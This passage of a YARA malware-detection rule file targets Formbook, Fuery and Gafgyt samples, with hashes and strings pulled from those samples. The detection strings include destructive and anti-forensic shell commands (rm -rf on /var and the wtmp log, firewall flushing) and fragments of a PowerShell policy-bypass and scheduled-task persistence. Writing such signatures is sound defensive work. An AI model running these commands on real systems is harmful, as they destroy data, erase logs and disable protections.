      $s9 = "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrom" ascii /* score: '13.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrom" ascii /* score: '13.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38" fullword ascii /* score: '12.00'*/
      $s12 = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/" ascii /* score: '12.00'*/
      $s13 = "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B31" ascii /* score: '12.00'*/
      $s14 = "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B31" ascii /* score: '12.00'*/
      $s15 = "Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/3" ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__58a53042_Formbook_signature__97e83759_40 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_58a53042.js, Formbook(signature)_97e83759.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "58a530421d7967d753aec2b38f9da5977995d60daf0992bbcce0f0e2895738a5"
      hash2 = "97e83759891322858bc515e01118e8e8d2c7cd7adf7dbee02d2ec45df07d3bce"
   strings:
      $s1 = "      return YKUYQ - jPntr;console.log(getGrades(90, 100, 75, 40, 89, 95));" fullword wide /* score: '24.00'*/
      $s2 = "  console.log(getGrades(\"" fullword wide /* score: '21.00'*/
      $s3 = "  console.log(\"" fullword wide /* score: '16.00'*/
      $s4 = "\");  console.log(\"" fullword wide /* score: '16.00'*/
      $s5 = "      console.log(getGrades(\"" fullword wide /* score: '16.00'*/
      $s6 = "      return  console.log(getGrades(\"" fullword wide /* score: '16.00'*/
      $s7 = "var goMUH = \" -executionpolicy \" ;" fullword wide /* score: '16.00'*/
      $s8 = "var shell = new ActiveXObject(\"WScript.Shell\");" fullword wide /* score: '15.00'*/
      $s9 = "var OqDlC = \"bypass \" ;" fullword wide /* score: '15.00'*/
      $s10 = "var kVrLB = (\"power\") + (\"shell\") ;" fullword wide /* score: '13.00'*/
      $s11 = "    console.log(\"" fullword wide /* score: '11.00'*/
      $s12 = "        console.log(\"" fullword wide /* score: '11.00'*/
      $s13 = "var aCWSY = bfHJJ + HwdxE ;" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0xfeff and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Fuery_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__Fuery_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0d95e_41 {
   meta:
      description = "_subset_batch - from files Fuery(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, Fuery(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0d95e636.exe, Fuery(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_46ceaed5.exe, Fuery(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_613965e3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "222472758402b62d15b12987ba1f0564b57131ecac2c3aff09c58533b9381b0a"
      hash2 = "0d95e636a7e133f2d04f8cdcc0e7e46628a3172f6f5e8e3f2ceea014c911fd4c"
      hash3 = "46ceaed5748b85d0f4941586d9478a6524882fd86a7892e1c3196d590699758a"
      hash4 = "613965e38d593894ff82b34419b95a5400054ed4519a86ff8b9a7a63cd3640b5"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $s2 = "svchosthelper.exe" fullword wide /* score: '27.00'*/
      $s3 = "systemhelper.exe" fullword wide /* score: '25.00'*/
      $s4 = "DownloaderService" fullword wide /* score: '22.00'*/
      $s5 = "DownloaderApp" fullword wide /* score: '19.00'*/
      $s6 = "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" fullword wide /* score: '17.00'*/
      $s7 = "\" start= auto DisplayName= \"Windows Download Service\"" fullword wide /* score: '13.00'*/
      $s8 = "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" fullword wide /* score: '11.00'*/
      $s9 = "/c schtasks /create /tn \"" fullword wide /* score: '11.00'*/
      $s10 = "WindowsLogsHelper" fullword wide /* score: '9.00'*/
      $s11 = "  <Actions Context=\"Author\">" fullword wide /* score: '9.00'*/
      $s12 = "    <Exec>" fullword wide /* score: '8.00'*/
      $s13 = "    </Exec>" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__099bbc70_Ga_gyt_signature__194f49f6_Ga_gyt_signature__3c851073_Ga_gyt_signature__4a7a3889_Ga_gyt_signatur_42 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature)_099bbc70.elf, Ga-gyt(signature)_194f49f6.elf, Ga-gyt(signature)_3c851073.elf, Ga-gyt(signature)_4a7a3889.elf, Ga-gyt(signature)_6dffbd5b.elf, Ga-gyt(signature)_70b5e54a.elf, Ga-gyt(signature)_774cf5e1.elf, Ga-gyt(signature)_790d635b.elf, Ga-gyt(signature)_8edf7088.elf, Ga-gyt(signature)_b7bf4fe7.elf, Ga-gyt(signature)_c0cdd140.elf, Ga-gyt(signature)_edcdc550.elf, Ga-gyt(signature)_eec3dcaa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "099bbc70566f0d047619264f78d26896c8caa1ee5ca0cb1d544dd4b2730a0d75"
      hash2 = "194f49f641ea7d3f29bbba944c4a72339f036bdea1614a40ac50e054abc5fc46"
      hash3 = "3c851073c27a32d4b0442c4ab91226872d6c8874bd8ef9720a0d35da17547ebb"
      hash4 = "4a7a38894b2e0194235b993a2aa9d2eccc3bcca5a061e1708c552d59aab16807"
      hash5 = "6dffbd5bad3dbd72e83e313e7d654a880df9552030d6c03a877b76adc2bb58e8"
      hash6 = "70b5e54a1c92223360c751e66d3190ba506f02c9a6a6e65c23b13a44c096e4c7"
      hash7 = "774cf5e15f9ed4377498d34d32cf4383282b133e64106037674d49717d92db8a"
      hash8 = "790d635b5fd44dfe404782b4b763629b3c73078cb29c73037ff6747b5c87828b"
      hash9 = "8edf7088424c71a87121b3dcad1b45982ebd3937f9ceb27e5bdde81b6c708cc9"
      hash10 = "b7bf4fe7f4609b3d01307de7807d5cbd52b053f58574fc4a46d3337cea27d9aa"
      hash11 = "c0cdd140b08ca6e8fd2ca805a1e745d9ca74b1b15b1d1f604b524b9f98e225f5"
      hash12 = "edcdc550aec62acf39f6de4cf551f746a6909bcead293af6e88bfec0b622cd49"
      hash13 = "eec3dcaa2e4f96007a5f5cfbf4341d0796b6369bda8aea3c148b01a73ef12274"
   strings:
      $s1 = "rm -rf /tmp/* /var/* /var/run/* /var/tmp/*" fullword ascii /* score: '15.00'*/
      $s2 = "[0;97m ] Connected -> " fullword ascii /* score: '14.00'*/
      $s3 = "get_telstate_host" fullword ascii /* score: '14.00'*/
      $s4 = "SexyTime Bruted -> %s [ %s:%s ]" fullword ascii /* score: '13.50'*/
      $s5 = "BusyBoxPayload" fullword ascii /* score: '13.00'*/
      $s6 = "rm -rf /var/log/wtmp" fullword ascii /* score: '13.00'*/
      $s7 = "tmpdirs" fullword ascii /* score: '11.00'*/
      $s8 = "rm -rf /bin/netstat" fullword ascii /* score: '11.00'*/
      $s9 = "/sbin/iptables -F; /sbin/iptables -X" fullword ascii /* score: '11.00'*/
      $s10 = "service firewalld stop" fullword ascii /* score: '9.00'*/
      $s11 = "nameserver 8.8.4.4" fullword ascii /* score: '9.00'*/
      $s12 = "service iptables stop" fullword ascii /* score: '9.00'*/
      $s13 = "getBuild" fullword ascii /* score: '9.00'*/
      $s14 = "getBuildz" fullword ascii /* score: '9.00'*/
      $s15 = "nameserver 8.8.8.8" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4_f09e1577_f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a0_43 {
   meta:
      description = "_subset_batch - from files f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4_f09e1577.elf, f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a06cfbac4c96ce3a5_f31094aa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f09e1577f6af02a154d8bb1ad4e946fbb8155f0cf75e3fb749eb446bb232e3b4"
      hash2 = "f31094aace3622e2a193f007c7cdf6eb9ad1199b5784096a06cfbac4c96ce3a5"
   strings:
      $s1 = "runtime.headTailIndex.split" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.makeHeadTailIndex" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s4 = "type:.eq.os.ProcessState" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.mix" fullword ascii /* score: '13.00'*/
      $s6 = "runtime.memhash128" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.taggedPointer.tag" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.vdsoFindVersion" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.mapassign_fast64ptr" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.(*pageAlloc).sysGrow.func2" fullword ascii /* score: '11.00'*/
      $s11 = "runtime.(*pageAlloc).sysGrow.func3" fullword ascii /* score: '11.00'*/
      $s12 = "runtime.(*pageAlloc).sysGrow.func1" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.mapdelete_fast64" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.vdsoauxv" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.vdsoParseSymbols" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 21000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__02ade22e_Ga_gyt_signature__099bbc70_Ga_gyt_signature__115d4aff_Ga_gyt_signature__117f7d25_Ga_gyt_signatur_44 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature)_02ade22e.elf, Ga-gyt(signature)_099bbc70.elf, Ga-gyt(signature)_115d4aff.elf, Ga-gyt(signature)_117f7d25.elf, Ga-gyt(signature)_12fa90d4.elf, Ga-gyt(signature)_1853d066.elf, Ga-gyt(signature)_194f49f6.elf, Ga-gyt(signature)_33fed557.elf, Ga-gyt(signature)_36dfa7be.elf, Ga-gyt(signature)_38cb8145.elf, Ga-gyt(signature)_3c851073.elf, Ga-gyt(signature)_4238ee25.elf, Ga-gyt(signature)_4a7a3889.elf, Ga-gyt(signature)_5529cd73.elf, Ga-gyt(signature)_6688e577.elf, Ga-gyt(signature)_6dffbd5b.elf, Ga-gyt(signature)_70b5e54a.elf, Ga-gyt(signature)_774cf5e1.elf, Ga-gyt(signature)_790d635b.elf, Ga-gyt(signature)_8221530c.elf, Ga-gyt(signature)_8edf7088.elf, Ga-gyt(signature)_a0dbcdaf.elf, Ga-gyt(signature)_a8176ff5.elf, Ga-gyt(signature)_b7bf4fe7.elf, Ga-gyt(signature)_bfd53fb7.elf, Ga-gyt(signature)_c0cdd140.elf, Ga-gyt(signature)_ca35fb33.elf, Ga-gyt(signature)_d93fb941.elf, Ga-gyt(signature)_ecea5593.elf, Ga-gyt(signature)_edcdc550.elf, Ga-gyt(signature)_eec3dcaa.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "02ade22e5b0a69704aa9862d491a866dd0b9974fbc54b9e5f920d84db5a9e2af"
      hash2 = "099bbc70566f0d047619264f78d26896c8caa1ee5ca0cb1d544dd4b2730a0d75"
      hash3 = "115d4aff6a22cff42f92f93b93dbc490a3faff85d6c0ed0b3cfac39f05473742"
      hash4 = "117f7d25832f1f174e0bba6dd3df98b3762d7bf7c33f9d952e677a7688d0821e"
      hash5 = "12fa90d48c61f2a5940d47ddeb4067351bdee5b1747f94f478795464a5e628f6"
      hash6 = "1853d06635409f80f521fe8bf5dca9f67356cc84eb805a0165fca20d991ce0b8"
      hash7 = "194f49f641ea7d3f29bbba944c4a72339f036bdea1614a40ac50e054abc5fc46"
      hash8 = "33fed5577c6434b83317ccac7236bddb015308e7eb2594078cf67ff9cc5e448f"
      hash9 = "36dfa7beb65e6afab7d250b19421674650c47df13c7cfe1d60f8f8b2d4da12b2"
      hash10 = "38cb814572e19263ba562b6b88820b01d3e72fc5e1a26063be5b7677e855f388"
      hash11 = "3c851073c27a32d4b0442c4ab91226872d6c8874bd8ef9720a0d35da17547ebb"
      hash12 = "4238ee2586dea220c2d955dc854f60a3562753cab1c39f5581464cd0c94bd7e9"
      hash13 = "4a7a38894b2e0194235b993a2aa9d2eccc3bcca5a061e1708c552d59aab16807"
      hash14 = "5529cd730747b493345c564cf5398d5c7333f83dcd5a84eac99475781dfc5025"
      hash15 = "6688e577ce161173f64535063dd402a3942f8ed15e5ec7615f2a6c1da8960d80"
      hash16 = "6dffbd5bad3dbd72e83e313e7d654a880df9552030d6c03a877b76adc2bb58e8"
      hash17 = "70b5e54a1c92223360c751e66d3190ba506f02c9a6a6e65c23b13a44c096e4c7"
      hash18 = "774cf5e15f9ed4377498d34d32cf4383282b133e64106037674d49717d92db8a"
      hash19 = "790d635b5fd44dfe404782b4b763629b3c73078cb29c73037ff6747b5c87828b"
      hash20 = "8221530c2fa6e83e4b3b41f47e9af9c24f48aa8297bd046d480de895e02de304"
      hash21 = "8edf7088424c71a87121b3dcad1b45982ebd3937f9ceb27e5bdde81b6c708cc9"
      hash22 = "a0dbcdafb9b9e0bf04112477df4dc4a33bd9503c9249772ce22b3aaa0d228236"
      hash23 = "a8176ff5b5cff316b8275642dd46966a19d7fc58603d91dbc6da7753fd8d9414"
      hash24 = "b7bf4fe7f4609b3d01307de7807d5cbd52b053f58574fc4a46d3337cea27d9aa"
      hash25 = "bfd53fb7889c2aea371009ceca59013268ca8179e9e1c5fe67a8f730d57e8fe7"
      hash26 = "c0cdd140b08ca6e8fd2ca805a1e745d9ca74b1b15b1d1f604b524b9f98e225f5"
      hash27 = "ca35fb33cf053bbb05c7d28dca4881130aa4d736178dcecb73edf540ba537988"
      hash28 = "d93fb9417b718ce39295f64663c367320f27c46a22c3ca71763de8658a038499"
      hash29 = "ecea5593626f11818b105bbc990131332a0da5791ceb1e8b85e3b858bbff1641"
      hash30 = "edcdc550aec62acf39f6de4cf551f746a6909bcead293af6e88bfec0b622cd49"
      hash31 = "eec3dcaa2e4f96007a5f5cfbf4341d0796b6369bda8aea3c148b01a73ef12274"
   strings:
      $s1 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspid" ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s3 = "er+(+http://www.baidu.com/search/spider.htm)" fullword ascii /* score: '17.00'*/
      $s4 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)" fullword ascii /* score: '17.00'*/
      $s5 = "zspider/0.9-dev http://feedback.redkolibri.com/" fullword ascii /* score: '17.00'*/
      $s6 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)" fullword ascii /* score: '17.00'*/
      $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729" ascii /* score: '15.00'*/
      $s8 = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)" fullword ascii /* score: '15.00'*/
      $s9 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)" fullword ascii /* score: '15.00'*/
      $s10 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" fullword ascii /* score: '15.00'*/
      $s11 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)" fullword ascii /* score: '15.00'*/
      $s12 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729" ascii /* score: '15.00'*/
      $s13 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)" fullword ascii /* score: '15.00'*/
      $s14 = "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__003ce48e_Ga_gyt_signature__099bbc70_Ga_gyt_signature__2b8ef56e_Ga_gyt_signature__36dfa7be_Ga_gyt_signatur_45 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature)_003ce48e.elf, Ga-gyt(signature)_099bbc70.elf, Ga-gyt(signature)_2b8ef56e.elf, Ga-gyt(signature)_36dfa7be.elf, Ga-gyt(signature)_3b558993.elf, Ga-gyt(signature)_4238ee25.elf, Ga-gyt(signature)_5bb6b335.elf, Ga-gyt(signature)_67a4f92e.elf, Ga-gyt(signature)_684668d3.elf, Ga-gyt(signature)_70b5e54a.elf, Ga-gyt(signature)_729fdb58.elf, Ga-gyt(signature)_8bc3acd0.elf, Ga-gyt(signature)_8f58389a.elf, Ga-gyt(signature)_962c7912.elf, Ga-gyt(signature)_995e632e.elf, Ga-gyt(signature)_a0dbcdaf.elf, Ga-gyt(signature)_a33aa07b.elf, Ga-gyt(signature)_bcc239c8.elf, Ga-gyt(signature)_c1083f40.elf, Ga-gyt(signature)_ca35fb33.elf, Ga-gyt(signature)_cf9a897f.elf, Ga-gyt(signature)_e4393a49.elf, Ga-gyt(signature)_e6e0d533.elf, Ga-gyt(signature)_e8560f2d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "003ce48e01614fa49fbf7197243d32349c0eab85190798cc2131a6f22f9e4d74"
      hash2 = "099bbc70566f0d047619264f78d26896c8caa1ee5ca0cb1d544dd4b2730a0d75"
      hash3 = "2b8ef56eb884414f3afcbbb720032bc4ce2d62b7be8ab8ad6362cd900f898c13"
      hash4 = "36dfa7beb65e6afab7d250b19421674650c47df13c7cfe1d60f8f8b2d4da12b2"
      hash5 = "3b5589935c96cc268c4ada75eaa2402eea660584ea4da5597142f07afdcc4a57"
      hash6 = "4238ee2586dea220c2d955dc854f60a3562753cab1c39f5581464cd0c94bd7e9"
      hash7 = "5bb6b335d5df8e953dafe382ef810d5629fa15f959655c1fcbe2af815ad4bb13"
      hash8 = "67a4f92e690aec804a0a96b61662d843c2d71215589e16769bf95d4b754c7c21"
      hash9 = "684668d3065daad253570100f3b947a50aad9be3e4429d02c156176899e23e60"
      hash10 = "70b5e54a1c92223360c751e66d3190ba506f02c9a6a6e65c23b13a44c096e4c7"
      hash11 = "729fdb587dd9b93b8d689209d68b2ef32678cb3263177d79e443046fb278c93c"
      hash12 = "8bc3acd0a436ba14ae9a575d2c248be46a023a8efa987404b26ba5ae55fa5400"
      hash13 = "8f58389ab90d9b8e9aed7c3d13f6bc637db07bfa7ac2c5f42a4ae61b7f4eade7"
      hash14 = "962c7912c44af279cd7879402913ca17968a64788b041b855867d42bf0441387"
      hash15 = "995e632e29a9c2635cfc9f693950e3ad07ae18028968e1427b306bb72e573a00"
      hash16 = "a0dbcdafb9b9e0bf04112477df4dc4a33bd9503c9249772ce22b3aaa0d228236"
      hash17 = "a33aa07b8f51e7bfee450b08b563fb72d93834f9955ad189795a49532f3cce97"
      hash18 = "bcc239c8ac93b5b198fd4c5be8da9a252ef9149fcc3c13986d364826a9c8d900"
      hash19 = "c1083f406437651d99f4b0a6fdbb3dc57f7268fc3c1f071b8330007ca9f36de6"
      hash20 = "ca35fb33cf053bbb05c7d28dca4881130aa4d736178dcecb73edf540ba537988"
      hash21 = "cf9a897fadec97206fe1f75f6978a04c333d37ac418fc1525bcabe3f13f225a0"
      hash22 = "e4393a49350ed5e410e1cf286c4b8b6df29224348c9972aadcded5cb74874fba"
      hash23 = "e6e0d5334a6b305ecb60f563aa16cb5d47ffa420a03799c030ac51d3ab869ff3"
      hash24 = "e8560f2d4c0c827c22ebb50e0b4da6b88eb54a67405b617fb1ed217e7196e98c"
   strings:
      $s1 = "nprocessors_onln" fullword ascii /* score: '15.00'*/
      $s2 = "gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s3 = "gethostname.c" fullword ascii /* score: '14.00'*/
      $s4 = "__GI_gethostname" fullword ascii /* score: '14.00'*/
      $s5 = "gethostbyname2_r.c" fullword ascii /* score: '14.00'*/
      $s6 = "gethostbyname2.c" fullword ascii /* score: '14.00'*/
      $s7 = "__GI_gethostbyname2_r" fullword ascii /* score: '14.00'*/
      $s8 = "__GI_gethostbyname2" fullword ascii /* score: '14.00'*/
      $s9 = "__resolv_attempts" fullword ascii /* score: '11.00'*/
      $s10 = "__GI_config_read" fullword ascii /* score: '10.00'*/
      $s11 = "fgetc.c" fullword ascii /* score: '9.00'*/
      $s12 = "readdir64" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__34091a47_Formbook_signature__3e74e18d_Formbook_signature__a126fd91_Formbook_signature__a8d02f8f_Formboo_46 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_34091a47.js, Formbook(signature)_3e74e18d.js, Formbook(signature)_a126fd91.js, Formbook(signature)_a8d02f8f.js, Formbook(signature)_bcdc0391.js, Formbook(signature)_cb6dd25a.js, Formbook(signature)_cd799699.js, Formbook(signature)_db59cee0.js, Formbook(signature)_f5225e59.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "34091a47d0eee3f09497f5bcd3b6a2819018de9870719a80b1ec1f9ce8fb6f2d"
      hash2 = "3e74e18d0294eeaf4559d75daaca76bfd5756e1f003c8f0554136f8361c905f7"
      hash3 = "a126fd91ee17af2166dd27cde3d5ea324c4634f87993c3ab03706c708ab6a63c"
      hash4 = "a8d02f8fac755f3e331d5bf3d5907c548e3d9177cddbc9b3136f1260fd91a245"
      hash5 = "bcdc0391c71724c75ffd61b8270751f78d5f38892b1af56f4875d831f154b8ee"
      hash6 = "cb6dd25abc15057fe7eb765c8b7402dd53833bd1489fa235a8d200d9e1b77716"
      hash7 = "cd7996990eeada00ec8902a547010be6aab2a9ff389e9cb37d4d6741c11711f0"
      hash8 = "db59cee03161a883b3919830974ddeb54f420d7f717d05b0a59f11ebe48cc771"
      hash9 = "f5225e591084fe0a87282b426c612f34d1606cef021353b051a8efc51bec3304"
   strings:
      $s1 = "// Process file list" fullword ascii /* score: '15.00'*/
      $s2 = "+ e.description);" fullword ascii /* score: '14.00'*/
      $s3 = "WScript.Sleep(500);" fullword ascii /* score: '13.00'*/
      $s4 = "if ( WScript.Arguments.Named.Exists('XSL') ) {" fullword ascii /* score: '10.00'*/
      $s5 = "// ReadOnlyRecommended" fullword ascii /* score: '10.00'*/
      $s6 = "if ( WScript.Arguments.Named.Exists('F') ) {" fullword ascii /* score: '10.00'*/
      $s7 = "if ( WScript.Arguments.Named.Exists('fg') ) {" fullword ascii /* score: '10.00'*/
      $s8 = "if ( WScript.Arguments.length < 1 || WScript.Arguments.Named.Exists('H') ) {" fullword ascii /* score: '10.00'*/
      $s9 = "// CompatibilityMode" fullword ascii /* score: '9.00'*/
      $s10 = "+ '] - ' " fullword ascii /* score: '9.00'*/
      $s11 = "+ (e.number & 0xFFFF) " fullword ascii /* score: '8.00'*/
      $s12 = "// /F:FB2 /XSL:filename" fullword ascii /* score: '8.00'*/
      $s13 = "// /F:TXT /L:lineending" fullword ascii /* score: '8.00'*/
      $s14 = "+ (e.number >> 0x10) " fullword ascii /* score: '8.00'*/
      $s15 = "// /F:TXT /E:Encoding" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Ga_gyt_signature__Ga_gyt_signature__8da6474c_Ga_gyt_signature__c9d27f1a_Ga_gyt_signature__d06bbde6_Ga_gyt_signature__d3a381_47 {
   meta:
      description = "_subset_batch - from files Ga-gyt(signature).elf, Ga-gyt(signature)_8da6474c.elf, Ga-gyt(signature)_c9d27f1a.elf, Ga-gyt(signature)_d06bbde6.elf, Ga-gyt(signature)_d3a381e7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "badbdf9d6e147862f9bccb34ad624a5aa705aebb05306687560f1dc699a87d50"
      hash2 = "8da6474cc31eddd180e1436dffa02880f44d024890967ee61ec12b6dd9485cea"
      hash3 = "c9d27f1afa200613296f2ed4267e05564e54d74dadf433a51bb82ca3a79325cb"
      hash4 = "d06bbde61018471ebd586072483c851cf05e4eca89d6345d2142c92a11aabd48"
      hash5 = "d3a381e7d3ab8913cbaa5b7727c938de321fc642ac14467862c7a8f4ba696639"
   strings:
      $s1 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '24.00'*/
      $s2 = "youtube.com" fullword ascii /* score: '21.00'*/
      $s3 = "omany.ultradns-geo.organy.edgecastcdn.netlarge.spf.trusteddomain.orgdkim20._domainkey.godaddy.comtxt.awsdns-hostedzone-info.coma" ascii /* score: '21.00'*/
      $s4 = "tiktok.com" fullword ascii /* score: '21.00'*/
      $s5 = "cloudflare.com" fullword ascii /* score: '21.00'*/
      $s6 = "live.com" fullword ascii /* score: '21.00'*/
      $s7 = "dnssec-root.iana.orgk.root-servers.netdnssec-failover.cloudflare.comany.dns.oracle.comany.dns.akamai-edge.netany.microsoft-dns.c" ascii /* score: '20.00'*/
      $s8 = "ns.bizdnssec.ripe.netdnssec-failed.orgroot-dnssec.netlarge-dns.akamai.comdns-bigresponse.cloudns.netlarge.txt.research.umbrella." ascii /* score: '20.00'*/
      $s9 = ".dehost-dane-self.weberdns.dehost-dnssec.weberdns.deany.isc.organy.cdn77.comany.awsdns-00.organy.cloudflare-dnssec.netany.ultrad" ascii /* score: '19.00'*/
      $s10 = "dns-bigresponse.cloudns.netlarge.txt.research.umbrella.com" fullword ascii /* score: '18.00'*/
      $s11 = "combigtxt.dns-oarc.netipv6.ripe.netaaaa.nasa.govipv6.google.comipv6.research.ix.ruipv6.6bone.netroot-servers.netdnssec.icann.org" ascii /* score: '16.00'*/
      $s12 = "nasa.gov" fullword ascii /* score: '10.00'*/
      $s13 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _eecde392387f983dbd8f222cb344d1d5d1368a79fee431de63415386702e7057_eecde392_f52a293724e9edfa2934196b922f1500114459869d31047ee_48 {
   meta:
      description = "_subset_batch - from files eecde392387f983dbd8f222cb344d1d5d1368a79fee431de63415386702e7057_eecde392.js, f52a293724e9edfa2934196b922f1500114459869d31047ee8261b9e26dcf8a5_f52a2937.lzh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eecde392387f983dbd8f222cb344d1d5d1368a79fee431de63415386702e7057"
      hash2 = "f52a293724e9edfa2934196b922f1500114459869d31047ee8261b9e26dcf8a5"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                           ' */ /* score: '26.50'*/
